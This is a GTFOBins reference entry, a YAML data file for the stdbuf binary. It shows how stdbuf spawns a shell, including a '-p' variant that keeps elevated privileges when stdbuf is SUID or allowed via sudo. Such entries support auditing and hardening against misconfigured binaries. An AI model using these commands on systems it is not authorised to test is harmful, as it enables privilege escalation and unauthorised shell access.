<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/stdbuf -->
---
functions:
  shell:
  - code: |-
      stdbuf -i0 /bin/sh
    contexts:
      sudo:
      suid:
        code: |-
          stdbuf -i0 /bin/sh -p
        shell: false
      unprivileged:
...
